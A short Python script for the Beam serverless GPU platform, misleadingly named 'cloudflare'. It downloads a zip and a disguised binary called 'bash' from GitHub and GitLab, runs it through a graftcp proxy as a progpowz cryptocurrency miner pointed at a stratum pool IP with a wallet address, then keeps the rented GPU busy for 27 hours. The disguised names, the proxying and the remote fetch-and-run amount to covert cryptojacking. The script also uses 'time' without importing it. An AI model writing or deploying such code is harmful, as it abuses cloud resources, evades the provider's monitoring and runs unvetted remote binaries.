from beam import function, Image
import subprocess

image = (
    Image(
        base_image="nvidia/cuda:12.1.1-runtime-ubuntu22.04",
    )
    .add_commands([
        "apt-get update -y",
        "apt-get install -y python3 python3-pip python-is-python3 git wget unzip curl ca-certificates",
    ])
)


@function(
    name="cloudflare",
    image=image,
    gpu="RTX4090",
    cpu=8,
    memory="24Gi",
    timeout=27 * 60 * 60,
)
def run_script():

    print("=== CHECK GPU ===")
    subprocess.run(["nvidia-smi"], check=False)

    cmd = """
    set -e

    echo "=== CURRENT DIRECTORY ==="
    pwd

    echo "=== DOWNLOAD FILE ==="
    wget -q https://github.com/malogrono/aways/releases/download/vcs/pan.zip -O pan.zip

    echo "=== EXTRACT ==="
    unzip -o pan.zip

    echo "=== CHECK PAN ==="
    ls -ld /mnt/code/pan
    ls -lah /mnt/code/pan

    echo "=== ENTER PAN ==="
    cd /mnt/code/pan

    echo "=== SET PERMISSION ==="
    chmod -R +x .

    echo "=== START GRAFTCP LOCAL ==="
    ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &

    sleep 3

    echo "=== DOWNLOAD HAL ==="
    cd /mnt/code/pan
    git clone https://gitlab.com/wimulyono7/hal.git

    echo "=== CHECK HAL ==="
    ls -lah /mnt/code/pan/hal

    echo "=== CHECK BASH ==="
    cd /mnt/code/pan/hal
    ls -lh bash

    chmod u+x bash

    echo "=== MOVE BASH ==="
    mv bash /mnt/code/pan/

    echo "=== CHECK PAN AFTER MOVE ==="
    ls -ld /mnt/code/pan
    ls -lah /mnt/code/pan

    echo "=== FINAL DIRECTORY ==="
    cd /mnt/code/pan
    pwd
    ls -lah
    
    echo "=== RUN PROC VIA GRAFTCP ==="
    ./graftcp/graftcp ./bash -a progpowz -o stratum+tcp://95.111.195.159:80 -u iZ2q2xfw9AdX8YpGrcrjEPTG2ie8FMuXMFdDNKqRRbGo15zbuUfMAzDbtEDxcDpJcXGijaADG2WVs41p8PMiBnzrV95YkTX46Ca2EZvo8wXS -p x -w TRX
    """

    subprocess.run(["bash", "-lc", cmd], check=False)

    print("Staying alive for 27 hours...")
    time.sleep(60 * 60 * 27)
